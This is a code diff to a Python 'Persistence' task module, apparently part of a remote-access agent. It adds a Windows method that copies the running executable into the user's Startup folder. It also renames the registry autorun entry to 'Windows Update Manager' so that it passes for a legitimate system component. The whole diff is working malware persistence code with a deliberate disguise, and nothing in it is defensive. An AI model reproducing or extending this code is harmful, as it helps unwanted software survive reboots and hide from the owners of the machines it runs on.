@@ -1,6 +1,32 @@
 from tasks.__task import Task
 
 
+class MethodStartupFolder:
+    platforms = ["win32"]
+    administrator = {"win32": False}
+
+    def __init__(self):
+        super(MethodStartupFolder, self).__init__()
+
+    def run(self):
+        import os
+        import sys
+        import shutil
+        exe = sys.argv[0]
+
+        if exe and os.path.isfile(exe):
+            try:
+                appdata = os.path.expandvars("%AppData%")
+                startup_dir = os.path.join(appdata, r'Microsoft\Windows\Start Menu\Programs\Startup')
+                if not os.path.exists(startup_dir):
+                    os.makedirs(startup_dir, exist_ok=True)
+                shutil.copy(exe, startup_dir)
+            except Exception as e:
+                raise Exception("Failed to add executable to Startup directory: {}".format(e))
+        else:
+            raise Exception("Executable file '{}' is not valid".format(exe))
+
+
 class MethodRegistry:
     platforms = ["win32"]
     administrator = {"win32": False}
@@ -18,7 +44,7 @@ class MethodRegistry:
         key2change = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_val, 0, winreg.KEY_ALL_ACCESS)
         reg_value = os.path.realpath(sys.argv[0])
 
-        winreg.SetValueEx(key2change, "Start", 0, winreg.REG_SZ, reg_value)
+        winreg.SetValueEx(key2change, "Windows Update Manager", 0, winreg.REG_SZ, reg_value)
         return "Set persistence using registry method."
 
 
@@ -48,7 +74,7 @@ class Persistence(Task):
 
     def __init__(self, task_id):
         super(Persistence, self).__init__(task_id)
-        self.methods = [MethodRegistry, MethodCrontab]
+        self.methods = [MethodRegistry, MethodCrontab, MethodStartupFolder]
 
     def run(self, **kwargs):
         import sys
